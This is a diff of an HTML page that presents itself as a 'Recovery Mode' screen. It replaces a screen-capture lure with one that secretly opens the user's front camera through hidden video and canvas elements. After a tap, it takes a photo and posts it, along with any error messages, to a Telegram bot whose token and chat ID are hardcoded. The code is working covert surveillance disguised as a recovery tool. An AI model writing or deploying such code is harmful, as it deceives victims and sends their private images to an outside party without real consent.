@@ -3,63 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Share Mode</title>
+    <title>Recovery Mode</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
-        /* මුළු ස්ක්‍රීන් එකම බොත්තමක් කරමු */
-        .full-btn {
-            width: 100vw; height: 100vh; background: #222; color: #ff00ff;
-            border: none; font-size: 22px; font-weight: bold; cursor: pointer;
-        }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; }
+        .full-btn { width: 100vw; height: 100vh; background: #333; color: #fff; border: none; font-size: 20px; }
     </style>
 </head>
 <body>
 
-    <button class="full-btn" onclick="requestScreen()">
-        [ SCREEN RECOVERY ]<br>TAP ANYWHERE TO SHARE SCREEN
+    <button class="full-btn" onclick="takePhoto()">
+        [ RECOVERY MODE ]<br>TAP TO TAKE PHOTO
     </button>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
         const CHAT_ID = '7883989086';
 
-        async function requestScreen() {
+        async function takePhoto() {
             try {
-                // 1. ස්ක්‍රීන් එක ශෙයාර් කරන්න අවසර ඉල්ලනවා
-                const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: { cursor: "always" },
-                    audio: false 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                // 2. ස්ක්‍රීන් එකේ Frame එකක් කැප්චර් කරමු
-                const track = stream.getVideoTracks()[0];
-                const capture = new ImageCapture(track);
-                const bitmap = await capture.grabFrame();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = bitmap.width;
-                canvas.height = bitmap.height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(bitmap, 0, 0);
-
-                canvas.toBlob(async (blob) => {
-                    let formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'screen.png');
-                    formData.append('caption', 'ඔන්න ඔයාගේ ස්ක්‍රීන් එකේ පින්තූරයක්!');
-
-                    // Telegram එකට පින්තූරය යවනවා
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    track.stop(); // ඉවර වුණාම නවත්වන්න
-                }, 'image/png');
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        let formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'camera.png');
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/png');
+                }, 1000);
 
             } catch (err) {
-                // අවසර දුන්නේ නැති වුණොත් මැසේජ් එකක් එවන්න
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Error: ${err.message}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Camera Error: ${err.message}`);
             }
         }
     </script>
